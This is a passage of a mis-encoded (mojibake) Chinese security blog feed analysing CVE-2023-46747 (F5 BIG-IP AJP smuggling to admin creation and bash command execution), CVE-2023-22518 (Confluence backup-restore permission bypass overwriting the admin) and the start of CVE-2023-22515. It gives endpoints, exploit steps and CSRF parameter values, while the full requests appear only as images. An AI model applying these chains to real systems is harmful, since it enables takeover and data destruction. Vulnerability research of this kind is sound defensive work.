&lt;p&gt;é€šè¿‡å®˜æ–¹çš„ä¿®å¤è¡¥ä¸å¯ä»¥çœ‹å‡ºæ¥å’Œæƒé™éªŒè¯ç›¸å…³ï¼Œå¹¶ä¸”ä¿®æ”¹äº†&lt;code&gt;proxy_ajp_conf&lt;/code&gt;æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå†ç»“åˆå·²æœ‰ä¿¡æ¯æ¨æµ‹è¿™æ˜¯ä¸€ä¸ªAJPèµ°ç§é—®é¢˜ï¼ˆç„¶è€Œå°±åœ¨åˆæ­¥éªŒè¯æˆåŠŸçš„æ—¶å€™chenå¸ˆå‚…å‘äº†ä¸€å¥è¯â€¦â€¦ï¼‰&lt;/p&gt;
&lt;p&gt;![image-20231030183353275](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030183353275.png)&lt;/p&gt;
&lt;p&gt;æ“¦ï¼Œç‚¹å¼€ä¸€çœ‹ç«Ÿç„¶æ˜¯pocï¼Œçœ‹äº†ä¸‹pocå’Œ/usr/share/tomcat/conf/server.xml&lt;/p&gt;
&lt;p&gt;![image-20231030183853806](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030183853806.png)&lt;/p&gt;
&lt;p&gt;çœäº†å¾ˆå¤šäº‹ï¼Œè¿™ä¸‹ç¡®å®šäº†æ˜¯AJPèµ°ç§çš„é—®é¢˜ï¼Œå› ä¸ºBIG-IPçš„Apacheæ˜¯åŸºäºApache 2.4.6çš„å®šåˆ¶ç‰ˆï¼Œæ‰€ä»¥ä¹Ÿä¼šå—AJPèµ°ç§çš„å½±å“ã€‚&lt;/p&gt;
&lt;p&gt;AJPèµ°ç§å¤§å®¶å¹¶ä¸é™Œç”Ÿï¼Œæ¯”å¦‚ghostcatå’ŒCVE-2022-26377è¿™ç±»çš„æ¼æ´å°±æ˜¯AJPèµ°ç§é€ æˆçš„ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„åˆ©ç”¨å°±æ¯”è¾ƒç®€å•äº†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;åœ¨BIG-IPçš„å†å²æ¼æ´&lt;a href=&quot;https://xz.aliyun.com/t/11418#toc-7&quot;&gt;CVE-2022-1388&lt;/a&gt;ä¸­å¾—çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä»&lt;code&gt;/mgmt/tm/util/bash&lt;/code&gt;æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å½“æ—¶æ˜¯åŸºäº&lt;code&gt;X-F5-Auth-Token&lt;/code&gt;æƒé™çš„ç»•è¿‡ï¼Œé‚£ä¹ˆæ—¢ç„¶æƒé™ç»•è¿‡å·²ç»ä¿®å¤äº†ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªå¯ä»¥é€šè¿‡è®¤è¯çš„&lt;code&gt;X-F5-Auth-Token&lt;/code&gt;ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯éœ€è¦åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é‚£ä¹ˆåˆ›å»ºè´¦æˆ·è¿™ä¸ªé—®é¢˜å°±æ¥åˆ°äº†tmuiä¸Šï¼Œæˆ‘ä»¬é€šè¿‡AJPèµ°ç§åˆ°&lt;code&gt;/tmui/Control/form&lt;/code&gt;è°ƒç”¨&lt;code&gt;/tmui/system/user/create.jsp&lt;/code&gt;æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å‚è€ƒ&lt;a href=&quot;https://clouddocs.f5.com/products/big-iq/mgmt-api/v5.4/ApiReferences/bigiq_api_ref/r_auth_login.html&quot;&gt;å®˜æ–¹æ–‡æ¡£&lt;/a&gt;çš„æ–¹å¼ï¼Œåˆ›å»ºå®Œæ–°çš„ç”¨æˆ·ä¹‹åå°±å¯ä»¥é€šè¿‡&lt;code&gt;/mgmt/shared/authn/login&lt;/code&gt;ç„¶åè¿”å›ç¬¬ä¸€æ­¥æ¥æ‰§è¡Œå‘½ä»¤ã€‚&lt;/p&gt;
&lt;p&gt;![image-20231030230918856](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030230918856.png)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æµç¨‹æ¦‚æ‹¬ä¸‹æ¥å°±æ˜¯ï¼šé€šè¿‡&lt;code&gt;/tmui/Control/form&lt;/code&gt;æ¥è°ƒç”¨&lt;code&gt;user/create.jsp&lt;/code&gt;ç„¶åä»&lt;code&gt;/mgmt/shared/authn/login&lt;/code&gt;è·å–æ–°çš„tokenï¼Œæœ€ååœ¨&lt;code&gt;/mgmt/tm/util/bash&lt;/code&gt;æ‰§è¡Œå‘½ä»¤ã€‚&lt;/p&gt;
&lt;p&gt;è¿™å…¶ä¸­æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;tmshä¸­è¿›è¡Œäº†csrfæ£€æµ‹ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€æ­¥è°ƒç”¨çš„æ—¶å€™éœ€è¦æ„é€ å¥½ä¸‰ä¸ªå‚æ•°&lt;code&gt;_timenow&lt;/code&gt; &lt;code&gt; Tmui-Dubbuf&lt;/code&gt;å’Œ&lt;code&gt;_bufvalue&lt;/code&gt;ï¼Œæ»¡è¶³&lt;code&gt;_bufvalue&lt;/code&gt;çš„å€¼ç­‰äº&lt;code&gt;Tmui-Dubbuf&lt;/code&gt;+&lt;code&gt;Tmui-Dubbuf&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;![image-20231030221855165](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030221855165.png)&lt;/p&gt;
&lt;p&gt;åœ¨nucleiç»™çš„pocä¸­ç”¨çš„æ˜¯ &lt;code&gt; Tmui-Dubbuf&lt;/code&gt;=BBBBBBBBBBBã€&lt;code&gt;_timenow&lt;/code&gt;=aã€&lt;code&gt;_bufvalue&lt;/code&gt;=eIL4RUnSwXYoPUIOGcOFx2o00Xc=&lt;/p&gt;
&lt;p&gt;![image-20231030223436120](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030223436120.png)&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä¹Ÿä½¿ç”¨è¿™ä¸‰ä¸ªé”®å€¼å¯¹è¿›è¡Œæ„é€ ï¼Œé‚£ä¹ˆæœ€åå¾—åˆ°çš„pocå°±æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;![](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030225639449.png)&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;Transfer-Encoding: chunked&lt;/code&gt;æ—¶ï¼Œä¼šä½¿ç”¨åˆ†å—ä¼ è¾“ç¼–ç ,ç¬¬ä¸€ä¸ª204å°±æ˜¯trunk sizeçš„å¤§å°ï¼Œç”¨åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶åå¯¹åº”516ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬èµ°ç§è¯·æ±‚çš„é•¿åº¦ï¼Œæœ€åçš„0è¡¨ç¤ºç»“å°¾ï¼Œå¦‚æœä¸æ˜¯ç”¨httpsçœ‹åˆ°çš„æ˜æ–‡å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;![](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030225723604.png)&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ­¥éª¤éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œä¸ä¸€å®šç¬¬ä¸€æ¬¡å°±æˆåŠŸï¼Œå‘ç°è¿”å›çš„ä¸æ˜¯ç™»å½•ç•Œé¢åå°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥äº†ï¼š&lt;/p&gt;
&lt;p&gt;é€šè¿‡è´¦å·å¯†ç è·å–åˆ°tokençš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;![](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030225832110.png)&lt;/p&gt;
&lt;p&gt;ç„¶åæ‰§è¡Œå‘½ä»¤ï¼š&lt;/p&gt;
&lt;p&gt;![image-20231030225947658](./CVE-2023-46747 F5 BIG-IP RCE/image-20231030225947658.png)&lt;/p&gt;
</content:encoded></item><item><title>CVE-2023-22518 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence</title><link>https://www.springkill.club/posts/cve-2023-22518-critical-privilege-escalation-vulnerability-in-atlassian-s-confluence/</link><guid isPermaLink="true">https://www.springkill.club/posts/cve-2023-22518-critical-privilege-escalation-vulnerability-in-atlassian-s-confluence/</guid><pubDate>Tue, 07 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;æ¼æ´æè¿°&lt;/h2&gt;
&lt;p&gt;åœ¨Confluenceä¸­å­˜åœ¨æƒé™éªŒè¯æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€è€Œå·²è¯·æ±‚æ¥è·å–æœåŠ¡å™¨æƒé™ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;ï¼ï¼ï¼ï¼æ³¨æ„ï¼Œæµ‹è¯•è¯¥æ¼æ´ä¼šå¯¼è‡´æ•°æ®ä¸å¯é€†æŸå¤±ï¼Œå¦‚éœ€æµ‹è¯•æ¼æ´è¯·ä¸€å®šè¦ä½¿ç”¨æµ‹è¯•ç¯å¢ƒï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;h2&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;p&gt;å’Œä¸Šæ¬¡ä¸€æ ·ï¼Œè€æ ·å­diffä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231031183007793.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹å¾ˆå¤šï¼Œä¸è¿‡æœ€å¼•äººæ³¨ç›®çš„è¿˜æ˜¯å¾ˆå¤šclassæ–‡ä»¶éƒ½æ–°å¢äº†ä¸¤ä¸ªæ³¨è§£ï¼Œçœ‹èµ·æ¥å°±æ˜¯å¯¹æƒé™åšäº†å¤„ç†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231031183544278.png&quot; alt=&quot;image-20231031183544278&quot; /&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆå°±æ¥äº†è§£ä¸‹ä»€ä¹ˆæ˜¯&lt;code&gt;websudo&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WebSudo æ˜¯ Atlassian Confluenceä¸­çš„ä¸€é¡¹å®‰å…¨ç‰¹æ€§ã€‚å®ƒçš„ç›®çš„æ˜¯ç¡®ä¿ç”¨æˆ·åœ¨æ‰§è¡Œä¸€äº›æ•æ„Ÿæ“ä½œä¹‹å‰é‡æ–°éªŒè¯è‡ªå·±çš„å‡­æ®ï¼Œä»¥æé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚

å½“ä¸€ä¸ªå·²ç™»å½•çš„ç”¨æˆ·è¯•å›¾è¿›è¡Œä¸€äº›å¯èƒ½å¯¹ç³»ç»Ÿæœ‰é‡å¤§å½±å“çš„æ“ä½œï¼Œä¾‹å¦‚æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€å®‰è£…æ’ä»¶ç­‰ï¼ŒConfluence ä¼šè¦æ±‚è¯¥ç”¨æˆ·é‡æ–°è¾“å…¥å¯†ç æ¥ç¡®è®¤ä»–ä»¬çš„èº«ä»½ã€‚è¿™ç§å†æ¬¡ç¡®è®¤èº«ä»½çš„æœºåˆ¶ç§°ä¸º WebSudoã€‚

å› ä¸ºå’Œsudoå¾ˆåƒï¼Œæ‰€ä»¥å°±å«äº†websudoã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çœ‹æ¥å…³é”®ç‚¹å°±åœ¨æƒé™ä¸Šäº†ï¼Œå†æ ¹æ®é•¿äº­çš„é€šå‘Šï¼Œå› ä¸ºconfluenceæ»¥ç”¨äº†strutsçš„ç»§æ‰¿å…³ç³»ï¼Œæ‰€ä»¥å¯¼è‡´äº†éƒ¨åˆ†æƒé™ç»•è¿‡ï¼Œå¹¶ä¸”æ¼æ´åˆ©ç”¨ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨diffä»£ç çš„æ—¶å€™çœ‹åˆ°äº†å¦‚ä¸‹å†…å®¹ï¼Œæœ€å¼€å§‹çš„æ€è·¯æ˜¯ç›´æ¥é€šè¿‡&lt;code&gt;bootstrap&lt;/code&gt;æ¥æŠŠ&lt;code&gt;confluence&lt;/code&gt;çš„æ•°æ®åº“åˆ‡æ¢åˆ°è‡ªå·±çš„æ•°æ®åº“ä¸Šï¼ˆå½“ç„¶å½“æ—¶æˆ‘å¹¶ä¸äº†è§£confluenceçš„bootstrapæ˜¯å¹²å˜›çš„ï¼‰ï¼Œèµ°äº†å¼¯è·¯ï¼Œåæ¥æƒ³äº†æƒ³è¿™æ ·çš„è¯ä¹Ÿä¸ä¼šä¸¢å¤±æ•°æ®æ— æ³•æ¢å¤ï¼Œåº”è¯¥æ˜¯ä¸€ç§è¦†ç›–çš„æ“ä½œæ‰å¯¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102142344827.png&quot; alt=&quot;image-20231102142344827&quot; /&gt;&lt;/p&gt;
&lt;p&gt;æ—¢ç„¶è¯´åˆ°äº†æƒé™é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥ç®€å•äº†è§£ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;https://struts.apache.org/core-developers/namespace-configuration&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231101024742977.png&quot; alt=&quot;image-20231101024742977&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å®é™…ä¸Š&lt;code&gt;confluence&lt;/code&gt;ä¸å…‰æ˜¯ä¼šå»&lt;code&gt;defualt&lt;/code&gt;æ¥è¿›è¡Œæ£€æŸ¥ï¼Œè€Œæ˜¯ä¼šå»è¢«ç»§æ‰¿çš„&lt;code&gt;namespace&lt;/code&gt;é€å±‚é€’å½’åˆ°&lt;code&gt;default&lt;/code&gt;ï¼Œæ‰€ä»¥å¯»æ‰¾ç»§æ‰¿äº†&lt;code&gt;admin&lt;/code&gt;çš„&lt;code&gt;namespace&lt;/code&gt;æœ€åå‘ç°&lt;code&gt;struts.xml&lt;/code&gt;ä¸­æœ‰è¿™ä¹ˆä¸€æ®µï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102135950080.png&quot; alt=&quot;image-20231102135950080&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¯´æ˜&lt;code&gt;json&lt;/code&gt;çš„å‘½åç©ºé—´å¯ä»¥è¿›è¡Œé€’å½’åˆ°adminï¼Œä¹Ÿå°±æ˜¯é€šå‘Šä¸­è¯´çš„æ»¥ç”¨ç»§æ‰¿å…³ç³»å¯¼è‡´éƒ¨åˆ†æƒé™ç»•è¿‡ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜äº†äº†ï¼Œåªéœ€è¦å¯»æ‰¾èƒ½å¤Ÿç ´åæ•°æ®çš„åŠŸèƒ½å°±å¯ä»¥äº†ï¼Œå®åœ¨æ˜¯ä¸æƒ³çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œè®©æˆ‘ä»¬æ„Ÿè°¢äººå·¥æ™ºèƒ½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143252681.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å¾ˆå¥½ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å»confluenceé‡Œé¢çœ‹å¤‡ä»½ç›¸å…³çš„ä¸œè¥¿äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143651277.png&quot; alt=&quot;image-20231102143651277&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç»è¿‡äº†å‡ æ¬¡åˆ›å»ºå’Œè¿˜åŸå¯ä»¥ç¡®å®šè¿™é‡Œç¡®å®èƒ½å¤Ÿè¿˜åŸadminçš„å¯†ç ï¼ˆæ¯•ç«Ÿæ˜¯å¤‡ä»½ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;ç›´æ¥åˆ›å»ºä¸€ä¸ªå¤‡ä»½å¹¶ä¸”ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åå»æœç´¢restoreç›¸å…³çš„actionï¼Œæœ€ç»ˆåœ¨ä¸æ–­åœ°å°è¯•ä¸‹å®šä½åˆ°äº†ä¸€ä¸ªactionï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143924658.png&quot; alt=&quot;image-20231102143924658&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å°è¯•ç”¨&lt;code&gt;json&lt;/code&gt;å‘½åç©ºé—´å»è®¿é—®è¿™ä¸ªactionï¼Œå¾—åˆ°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼ˆæ³¨æ„è¿™é‡Œè¦ç”¨POSTè¿›è¡Œè®¿é—®ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144319982.png&quot; alt=&quot;image-20231102144319982&quot; /&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°ä¸‹é¢æ˜¯æˆ‘åˆ›å»ºçš„å¾ˆå¤šå¤‡ä»½æ–‡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œå…¶å®æ˜¯æœ‰å‘çš„ï¼Œåœ¨ç›´æ¥æ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŒ…çš„æ—¶å€™ï¼Œå¯¹é¢è¿”å›çš„ç›¸åº”æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144656162.png&quot; alt=&quot;image-20231102144656162&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å¾ˆå¥‡æ€ªï¼Œæˆ‘æ˜æ˜åˆ›å»ºçš„æ˜¯&lt;code&gt;site&lt;/code&gt;çš„åŒ…ï¼Œä¸ºä»€ä¹ˆè¯´æˆ‘å°è¯•æ¢å¤&lt;code&gt;space&lt;/code&gt;ï¼Œåˆåˆ›å»ºäº†å‡ ä¸ªæ— æœåï¼Œè§‰å¾—è¿˜æ˜¯è¦å»çœ‹çœ‹ä»£ç ï¼Œç›´æ¥æœç´¢æç¤ºè¯­ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144818992.png&quot; alt=&quot;image-20231102144818992&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè¿›å…¥&lt;code&gt;SetupRestoreAction.class&lt;/code&gt;ä¸‹ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å¯¼è‡´è¿™ä¸ªé—®é¢˜çš„åŸå› æ˜¯&lt;code&gt;validate()&lt;/code&gt;æ–¹æ³•æ£€éªŒäº†ä¸€ä¸‹&lt;code&gt;exportScope&lt;/code&gt;æ˜¯å¦æ˜¯&lt;code&gt;ALL&lt;/code&gt;ï¼Œä½†æ˜¯æˆ‘ä»¬åˆ›å»ºçš„æ˜¯&lt;code&gt;SITE&lt;/code&gt;å¥½å®¶ä¼™ï¼Œè¿™å“ªæœ‰ALLçš„åŒ…å•Šï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102152808970.png&quot; alt=&quot;image-20231102152808970&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102150744866.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ï¼ˆå…¶å®åœ¨è¿™é‡Œç›´æ¥æ”¹æˆALLåº”è¯¥æ¥å¯ä»¥äº†ï¼‰&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æˆ‘æƒ³æ‰¾åˆ°æ ¹æœ¬åŸå› ï¼Œé—®é¢˜åªèƒ½æ˜¯å‡ºåœ¨å¤‡ä»½çš„æ—¶å€™äº†ï¼Œå‘ç°åœ¨confluenceçš„å¤‡ä»½ä¸­å…¶å®åªæœ‰ä¸¤ä¸ªé€‰é¡¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102154048341.png&quot; alt=&quot;image-20231102154048341&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102154111144.png&quot; alt=&quot;image-20231102154111144&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™å°±è¦ç”¨å¦ä¸€ä¸ªæ¥å£äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102161124328.png&quot; alt=&quot;image-20231102161124328&quot; /&gt;&lt;/p&gt;
&lt;p&gt;åœ¨ç™»é™†çŠ¶æ€ä¸‹è®¿é—®&lt;code&gt;json/backup.action&lt;/code&gt;ç„¶åç”Ÿæˆçš„è¢«åˆ†åŒ…æ‰€å¸¦çš„æ˜¯&lt;code&gt;ALL&lt;/code&gt;æ ‡ç­¾ï¼Œå†æ¬¡æ„é€ åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102161312582.png&quot; alt=&quot;image-20231102161312582&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°è·³è½¬åœ°å€å’Œstruts.xmlå†™çš„ä¸€æ ·ï¼Œè¿™é‡Œè¦æ³¨æ„&lt;code&gt;synchronous=true&lt;/code&gt;çš„è®¾ç½®ï¼Œå‘é€å®ŒåŒ…åç­‰å¾…ä¸€å°ä¼šå„¿ï¼Œå°±ä¼šå°†å¤‡ä»½å¯¼å…¥ï¼Œå½“ç„¶åŸå…ˆè®¾ç½®å¥½çš„ç®¡ç†å‘˜è´¦å·å¯†ç ä¹Ÿä¼šè¢«å¤‡ä»½ä¸­çš„å†…å®¹è¦†ç›–ã€‚&lt;/p&gt;
&lt;h2&gt;RCE&lt;/h2&gt;
&lt;p&gt;å‚è€ƒå†å²æ¼æ´å³å¯RCEï¼Œè€ç”Ÿå¸¸è°ˆï¼Œä¸è¿‡å¤šè¯´å•¦ã€‚&lt;/p&gt;
</content:encoded></item><item><title>CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence</title><link>https://www.springkill.club/posts/cve-2023-22515-critical-privilege-escalation-vulnerability-in-atlassians-confluence/</link><guid isPermaLink="true">https://www.springkill.club/posts/cve-2023-22515-critical-privilege-escalation-vulnerability-in-atlassians-confluence/</guid><pubDate>Wed, 18 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;æ¼æ´æè¿°&lt;/h2&gt;
&lt;p&gt;CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence æ˜¯ Atlassian å…¬å¸å¼€å‘çš„ä¸€æ¬¾å›¢é˜Ÿåˆä½œè½¯ä»¶ï¼Œä¸»è¦ç”¨äºå›¢é˜Ÿæˆå‘˜å…±äº«çŸ¥è¯†ã€åä½œæ–‡æ¡£å’Œé›†ä¸­å­˜å‚¨èµ„æ–™ã€‚å®ƒå¹¿æ³›åº”ç”¨äºå„ç§ç»„ç»‡ä¸­ï¼Œä¸ä»…æ˜¯æŠ€æœ¯å›¢é˜Ÿï¼Œè¿˜æœ‰å…¶ä»–ä»»ä½•éœ€è¦æ–‡æ¡£åˆä½œæˆ–çŸ¥è¯†å…±äº«çš„å›¢é˜Ÿã€‚&lt;/p&gt;
&lt;p&gt;åœ¨8.0.0&amp;lt;CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence&amp;lt;8.2.3ã€CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence&amp;lt;8.3.3ã€CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence&amp;lt;8.4.3ã€CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence&amp;lt;8.5.2ä¸­å­˜åœ¨æƒé™æå‡æ¼æ´ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·å¯ä»¥åˆ›å»ºæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚&lt;/p&gt;
&lt;h2&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;p&gt;æ—¢ç„¶å·²ç»ä¿®å¤è¿‡äº†ï¼Œå°±æŒ‰ç…§è€æ ·å­ï¼Œåˆ†æä¸€ä¸‹å·®å¼‚ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨äº†8.5.1å’Œ8.5.2ç‰ˆæœ¬çš„jaræ¥è¿›è¡Œåˆ†æï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012132908575](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012132908575.png)&lt;/p&gt;
&lt;p&gt;é¦–å…ˆé‡è¦çš„å˜åŒ–å°±æ˜¯åˆ é™¤å’Œæ–°å¢äº†å‡ ä¸ªç±»ï¼š&lt;/p&gt;
&lt;p&gt;åˆ é™¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ServerInfoAction&lt;/code&gt;ç±»&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ServerInfoFilter&lt;/code&gt;ç±»&lt;/p&gt;
&lt;p&gt;æ–°å¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ReadOnlyApplicationConfig&lt;/code&gt;ç±»
&lt;code&gt;ReadOnlySetupPersister&lt;/code&gt;ç±»
ä¸»è¦æ˜¯æ–°å¢çš„ä¸¤ä¸ªç±»ï¼Œå¯ä»¥çœ‹åˆ°ä¸¤ä¸ª&lt;code&gt;ReadOnly&lt;/code&gt;éƒ½ç»§æ‰¿è‡ªåŸæœ‰çš„ç±»ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§â€œå¢å¼ºâ€ï¼Œå½“ä½¿ç”¨setterçš„æ—¶å€™ï¼ŒæŠ›å‡ºä¸€ä¸ª&lt;code&gt;UnsupportedOperationException&lt;/code&gt;æ¥æ‹’ç»ä¿®æ”¹ï¼Œè¿™æ ·å°±å°†ç±»å˜ä¸ºåªè¯»æ¥è§„é¿æŸäº›é£é™©ã€‚&lt;/p&gt;
&lt;p&gt;å…·ä½“å°±æ˜¯åœ¨&lt;code&gt;BootstrapStatusProviderImpl&lt;/code&gt;çš„ä¿®æ”¹ä¸­ä½“ç°çš„ï¼Œå°†åŸå…ˆçš„&lt;code&gt;this.delegate.getApplicationConfig();&lt;/code&gt;æ”¹ä¸º&lt;code&gt;return new ReadOnlyApplicationConfig(this.delegate.getApplicationConfig());&lt;/code&gt;&lt;/p&gt;
